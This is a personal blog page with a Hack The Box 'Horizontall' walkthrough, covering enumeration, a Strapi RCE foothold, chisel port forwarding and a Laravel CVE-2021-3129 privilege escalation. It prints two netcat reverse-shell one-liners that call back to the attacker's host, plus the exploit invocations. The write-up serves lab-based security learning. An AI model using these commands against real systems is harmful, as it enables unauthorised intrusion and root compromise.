@@ -1,0 +1,378 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+
+  <meta charset="utf-8" />
+
+  
+  <title>Horizontall Hackthebox writeup</title>
+
+  
+  
+  <link href="//cdn.jsdelivr.net" rel="dns-prefetch">
+  <link href="//cdnjs.cloudflare.com" rel="dns-prefetch">
+  
+  <link href="//at.alicdn.com" rel="dns-prefetch">
+  
+  <link href="//fonts.googleapis.com" rel="dns-prefetch">
+  <link href="//fonts.gstatic.com" rel="dns-prefetch">
+  
+  
+  
+  <link href="//www.google-analytics.com" rel="dns-prefetch">
+  
+
+  
+
+  
+  <meta name="author" content="0xMesbaha">
+  <meta name="description" content="we got low-privilege access due to Vulnerable version of strapi CMS then got root access because of the Vulnerable Version of Laravel. main techniques used are : Vhost enumeration and port forwarding without ssh
+">
+
+  
+  
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:site" content="@gohugoio">
+    <meta name="twitter:title" content="Horizontall Hackthebox writeup">
+    <meta name="twitter:description" content="we got low-privilege access due to Vulnerable version of strapi CMS then got root access because of the Vulnerable Version of Laravel. main techniques used are : Vhost enumeration and port forwarding without ssh
+">
+    <meta name="twitter:image" content="/media/Horizontall/start.png">
+  
+
+  
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Horizontall Hackthebox writeup">
+  <meta property="og:description" content="we got low-privilege access due to Vulnerable version of strapi CMS then got root access because of the Vulnerable Version of Laravel. main techniques used are : Vhost enumeration and port forwarding without ssh
+">
+  <meta property="og:url" content="/post/horizontall/">
+  <meta property="og:image" content="/media/Horizontall/start.png">
+
+
+
+
+<meta name="generator" content="Hugo 0.86.1">
+
+
+<link rel="canonical" href="/post/horizontall/">
+
+<meta name="renderer" content="webkit">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="format-detection" content="telephone=no,email=no,adress=no">
+<meta http-equiv="Cache-Control" content="no-transform">
+
+
+<meta name="robots" content="index,follow">
+<meta name="referrer" content="origin-when-cross-origin">
+<meta name="google-site-verification" content="_moDmnnBNVLBN1rzNxyGUGdPHE20YgbmrtzLIbxaWFc">
+
+
+
+
+
+
+<meta name="theme-color" content="#02b875">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black">
+<meta name="apple-mobile-web-app-title" content="0xMesbaha">
+<meta name="msapplication-tooltip" content="0xMesbaha">
+<meta name='msapplication-navbutton-color' content="#02b875">
+<meta name="msapplication-TileColor" content="#02b875">
+<meta name="msapplication-TileImage" content="/icons/icon-144x144.png">
+<link rel="icon" href="/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="/icons/icon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/icons/icon-32x32.png">
+<link rel="icon" sizes="192x192" href="/icons/icon-192x192.png">
+<link rel="apple-touch-icon" href="/icons/icon-152x152.png">
+<link rel="manifest" href="/manifest.json">
+
+
+<link rel="preload" href="/styles/main-rendered.min.css" as="style">
+
+
+<link rel="preload" href="https://fonts.googleapis.com/css?family=Lobster" as="style">
+<link rel="preload" href="/images/avatar.gif" as="image">
+<link rel="preload" href="/images/grey-prism.svg" as="image">
+
+
+<style>
+  body {
+    background: rgb(244, 243, 241) url('/images/grey-prism.svg') repeat fixed;
+  }
+</style>
+<link rel="stylesheet" href="/styles/main-rendered.min.css">
+
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lobster">
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/medium-zoom@1.0.2/dist/medium-zoom.min.js"></script>
+
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/video.js@7.3.0/dist/video-js.min.css">
+
+
+
+  
+  
+<!--[if lte IE 8]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/videojs-ie8@1.1.2/dist/videojs-ie8.min.js"></script>
+<![endif]-->
+
+<!--[if lte IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/eligrey-classlist-js-polyfill@1.2.20180112/classList.min.js"></script>
+<![endif]-->
+
+
+</head>
+  <body>
+    <div class="suspension">
+      <a role="button" aria-label="Go to top" title="Go to top" class="to-top is-hide"><span class="icon icon-up" aria-hidden="true"></span></a>
+      
+        
+      
+    </div>
+    
+    
+  <header class="site-header">
+  <a href=""><img class="avatar" src="/images/avatar.gif" alt="Avatar"></a>
+  
+  <h2 class="title"><a href="">0xMesbaha</a></h2>
+  
+  <p class="subtitle">&gt; Hello Friend , I am a cybersecurity
+enthusiast trying my best to sharpen myskills and to expand my horizons. Interested in bloging about CTFs writeups , Hackthebox writeups and some interesting topics i want to share with you</p>
+  <button class="menu-toggle" type="button" aria-label="Main Menu" aria-expanded="false" tab-index="0">
+    <span class="icon icon-menu" aria-hidden="true"></span>
+  </button>
+
+  <nav class="site-menu collapsed">
+    <h2 class="offscreen">Main Menu</h2>
+    <ul class="menu-list">
+      
+      
+      
+      
+        <li class="menu-item
+          
+          
+           is-active">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="menu-item
+          
+          
+          ">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+    </ul>
+  </nav>
+  <nav class="social-menu collapsed">
+    <h2 class="offscreen">Social Networks</h2>
+    <ul class="social-list"><li class="social-item">
+          <a href="//github.com/hussienMisbah" rel="me" title="GitHub" aria-label="GitHub">
+	    <span class="icon icon-github" aria-hidden="true"></span>
+          </a>
+        </li><li class="social-item">
+          <a href="//www.linkedin.com/in/hussien-6331151b2" rel="me" title="LinkedIn" aria-label="LinkedIn">
+            <span class="icon icon-linkedin" aria-hidden="true"></span>
+          </a>
+        </li></ul>
+  </nav>
+</header>
+
+  <section class="main post-detail">
+    <header class="post-header">
+      <h1 class="post-title">Horizontall Hackthebox writeup</h1>
+      <p class="post-meta">@0xMesbaha · Feb 4, 2022 · 3 min read</p>
+    </header>
+    <article class="post-content"><p>we got low-privilege access due to Vulnerable version of strapi CMS then got root access because of the Vulnerable Version of Laravel. main techniques used are : Vhost enumeration and port forwarding without ssh</p>
+<h1 id="scanning-">Scanning :</h1>
+<p>to make our life easier will export ip to use the variable $IP instead of re-typing ip</p>
+<pre><code>$export IP=10.10.11.105
+</code></pre><p>starting with a basic scanning :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$nmap -sV -v $IP -oN nmap/intial
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+80/tcp open  http    nginx 1.14.0 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+
+</code></pre></div><p>when try to visit http it can&rsquo;t be opened which is an indicator we will need to make Vhost enumeration Latter</p>
+<p><img src="/media/Horizontall/20210906143308.png" alt="error"></p>
+<p>so you need to add it to /etc/hosts</p>
+<p><img src="/media/Horizontall/20210906143207.png" alt="error"></p>
+<h3 id="directory-busting-">directory Busting :</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ gobuster dir -u <span style="color:#e6db74">&#34;http://horizontall.htb/&#34;</span> -w /usr/share/wordlists/dirb/common.txt   
+</code></pre></div><p>results :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">/css                  <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 194<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://horizontall.htb/css/<span style="color:#f92672">]</span>
+/favicon.ico          <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 4286<span style="color:#f92672">]</span>                                 
+/img                  <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 194<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://horizontall.htb/img/<span style="color:#f92672">]</span>
+/index.html           <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 901<span style="color:#f92672">]</span>                                  
+/js                   <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 194<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>--&gt; http://horizontall.htb/js/<span style="color:#f92672">]</span>
+
+</code></pre></div><h3 id="vhosts-enumeration-">Vhosts enumeration :</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ gobuster vhost -u horizontall.htb  -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
+</code></pre></div><p>you can also use ffuf like this :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H <span style="color:#e6db74">&#34;Host: FUZZ.Horizontall.htb&#34;</span> -u http://horizontall.htb/ -c -fc <span style="color:#ae81ff">301</span>
+</code></pre></div><p>-fc : filter by code u don&rsquo;t want</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">results:
+www                     <span style="color:#f92672">[</span>Status: 200, Size: 901, Words: 43, Lines: 2<span style="color:#f92672">]</span>
+api-prod                <span style="color:#f92672">[</span>Status: 200, Size: 413, Words: 76, Lines: 20<span style="color:#f92672">]</span>
+</code></pre></div><p>add api-prod to the /etc/hosts
+<img src="/media/Horizontall/20210906150314.png" alt="error"></p>
+<h2 id="foothold-">Foothold :</h2>
+<p><img src="/media/Horizontall/20210906150257.png" alt="error"></p>
+<h3 id="directory-busting--1">Directory Busting :</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ffuf -c -w /usr/share/wordlists/dirb/common.txt -u http://api-prod.horizontall.htb/FUZZ
+
+</code></pre></div><p>results :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Admin                   <span style="color:#f92672">[</span>Status: 200, Size: 854, Words: 98, Lines: 17<span style="color:#f92672">]</span>
+ADMIN                   <span style="color:#f92672">[</span>Status: 200, Size: 854, Words: 98, Lines: 17<span style="color:#f92672">]</span>
+admin                   <span style="color:#f92672">[</span>Status: 200, Size: 854, Words: 98, Lines: 17<span style="color:#f92672">]</span>
+favicon.ico             <span style="color:#f92672">[</span>Status: 200, Size: 1150, Words: 4, Lines: 1<span style="color:#f92672">]</span>
+index.html              <span style="color:#f92672">[</span>Status: 200, Size: 413, Words: 76, Lines: 20<span style="color:#f92672">]</span>
+reviews                 <span style="color:#f92672">[</span>Status: 200, Size: 507, Words: 21, Lines: 1<span style="color:#f92672">]</span>
+robots.txt              <span style="color:#f92672">[</span>Status: 200, Size: 121, Words: 19, Lines: 4<span style="color:#f92672">]</span>
+users                   <span style="color:#f92672">[</span>Status: 403, Size: 60, Words: 1, Lines: 1<span style="color:#f92672">]</span>
+</code></pre></div><p><img src="/media/Horizontall/20210906150553.png" alt="error"></p>
+<p>searching for strapi exploit and found RCE exploit <a href="https://www.exploit-db.com/raw/50239">here</a></p>
+<p>as we see it is a blind RCE we can verify it is valid By pinging our host :</p>
+<p><img src="/media/Horizontall/20210906152020.png" alt="error"></p>
+<p>so let&rsquo;s get our reverse shell :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc &lt;my_ip&gt; <span style="color:#ae81ff">9999</span> &gt;/tmp/f
+</code></pre></div><h3 id="stablize-the-shell--">stablize the shell  :</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">python <span style="color:#f92672">-</span>c <span style="color:#e6db74">&#34;import pty;pty.spawn(&#39;/bin/bash&#39;)&#34;</span>
+</code></pre></div><h3 id="we-are-in">we are in</h3>
+<p><img src="/media/Horizontall/20210906143208.png" alt=""></p>
+<h2 id="privilege-escalation-">Privilege escalation :</h2>
+<p>after some manual enumeration i tried to see what are the ports running on this machine with</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">ss -lpnut
+</code></pre></div><p>and found this :</p>
+<pre><code>Netid  State    Recv-Q   Send-Q      Local Address:Port     Peer Address:Port                                                                                   
+tcp    LISTEN   0        128             127.0.0.1:8000          0.0.0.0:*
+</code></pre><p>you can also run <a href="https://github.com/rebootuser/LinEnum">LinEnum</a> and reach the same conclusion</p>
+<p>this port wasn&rsquo;t in the nmap scan so it isn&rsquo;t publiclly exposed.</p>
+<p>to verify this is a path we can take to look for an escalation Factor i tried to see what is the service running at this port :</p>
+<p><img src="/media/Horizontall/20210906143218.png" alt=""></p>
+<p>and at the bottom of the output i found :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Laravel v8 <span style="color:#f92672">(</span>PHP v7.4.18<span style="color:#f92672">)</span>
+</code></pre></div><p>searching if it has an exploit and found many so we can now do <strong>port forwarding</strong> to see the web page at our browser and deal with it</p>
+<h2 id="port-forwading">port forwading</h2>
+<p>we have many ways to achieve that i tried ssh remote port forwarding But it doesn&rsquo;t work , so i used <a href="https://github.com/jpillora/chisel/releases">chisel</a></p>
+<ul>
+<li>download version on your side and upload same version on the victim side</li>
+</ul>
+<p>so what we are going to do here is port forward 8000 at this machine to 8000 at our machine and the traffic is through port 12312</p>
+<blockquote>
+<p>commands :</p>
+</blockquote>
+<p>on server side (my side) :</p>
+<p><code>$./chisel_1.7.6_linux_amd64 server -p 12312 --reverse</code></p>
+<p>on victim side :</p>
+<p><code>$ ./chisel_1.7.6_linux_amd64 client &lt;my_ip&gt;:12312 R:8000:127.0.0.1:8000</code></p>
+<p><img src="/media/Horizontall/20210906154327.png" alt="error"></p>
+<p>now as we said before this laravel version has exploits i used <a href="https://github.com/nth347/CVE-2021-3129_exploit/blob/master/exploit.py">this</a> one</p>
+<p>testing it :</p>
+<p><img src="/media/Horizontall/20210906154800.png" alt="error"></p>
+<p>so let&rsquo;s get a reverse shell Finally as root</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">python3 exploit.py <span style="color:#e6db74">&#34;http://127.0.0.1:8000&#34;</span> Monolog/RCE1 <span style="color:#e6db74">&#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc &lt;my_ip&gt; 8888 &gt;/tmp/f&#34;</span>
+</code></pre></div><p><img src="/media/Horizontall/20210906154921.png" alt="error"></p>
+<p>pwned on 5 september 2021 .</p></article>
+    <footer class="post-footer">
+      
+      <ul class="post-tags">
+        
+          <li><a href="/tags/hackthebox"><span class="tag">Hackthebox</span></a></li>
+        
+          <li><a href="/tags/port-forwading"><span class="tag">Port Forwading</span></a></li>
+        
+          <li><a href="/tags/chisel"><span class="tag">Chisel</span></a></li>
+        
+      </ul>
+      
+      <p class="post-copyright">
+        © all rights reserved for 0xMesbaha.
+      </p>
+    </footer>
+    
+      
+    
+  </section>
+  
+<footer class="site-footer">
+  <p>© 2017-2022 0xMesbaha</p>
+  <p>Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> with theme <a href="https://github.com/laozhu/hugo-nuo" target="_blank" rel="noopener">Nuo</a>.</p>
+  
+</footer>
+
+
+<script src="https://cdn.jsdelivr.net/npm/smooth-scroll@15.0.0/dist/smooth-scroll.min.js"></script>
+
+
+
+<script async src="https://cdn.jsdelivr.net/npm/video.js@7.3.0/dist/video.min.js"></script>
+
+
+
+
+<script async src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [['$','$'], ['\\(','\\)']],
+      displayMath: [['$$','$$'], ['\\[','\\]']],
+      processEscapes: true,
+      processEnvironments: true,
+      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+      TeX: { equationNumbers: { autoNumber: "AMS" },
+      extensions: ["AMSmath.js", "AMSsymbols.js"] }
+    },
+  });
+</script>
+<script type="text/x-mathjax-config">
+  // Fix <code> tags after MathJax finishes running. This is a
+  // hack to overcome a shortcoming of Markdown. Discussion at
+  // https://github.com/mojombo/jekyll/issues/199
+  MathJax.Hub.Queue(() => {
+    MathJax.Hub.getAllJax().map(v => v.SourceElement().parentNode.className += ' has-jax');
+  });
+</script>
+
+
+
+<script src="/scripts/index.min.js"></script>
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.register('\/service-worker.js').then(function() {
+      console.log('[ServiceWorker] Registered');
+    });
+  }
+</script>
+
+
+
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-XXXXXXXX-X', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+
+
+
+
+
+
+  </body>
+</html>
